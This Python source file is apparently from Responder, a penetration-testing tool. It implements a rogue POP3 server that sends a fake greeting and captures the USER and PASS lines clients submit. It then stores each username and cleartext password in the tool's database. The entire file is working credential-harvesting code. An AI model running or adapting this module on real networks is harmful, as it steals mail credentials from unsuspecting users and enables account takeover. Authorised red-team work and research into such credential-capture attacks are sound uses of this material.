#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import settings

from utils import *
from SocketServer import BaseRequestHandler
from packets import POPOKPacket

# POP3 Server class
class POP3(BaseRequestHandler):

	def SendPacketAndRead(self):
		Packet = POPOKPacket()
		self.request.send(str(Packet))
		data = self.request.recv(1024)

		return data

	def handle(self):
		try:
			data = self.SendPacketAndRead()

			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				data = self.SendPacketAndRead()

			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")

				SaveToDb({
					'module': 'POP3', 
					'type': 'Cleartext', 
					'client': self.client_address[0], 
					'user': User, 
					'cleartext': Pass, 
					'fullhash': User+":"+Pass,
				})

				data = self.SendPacketAndRead()

			else:
				data = self.SendPacketAndRead()

		except Exception:
			pass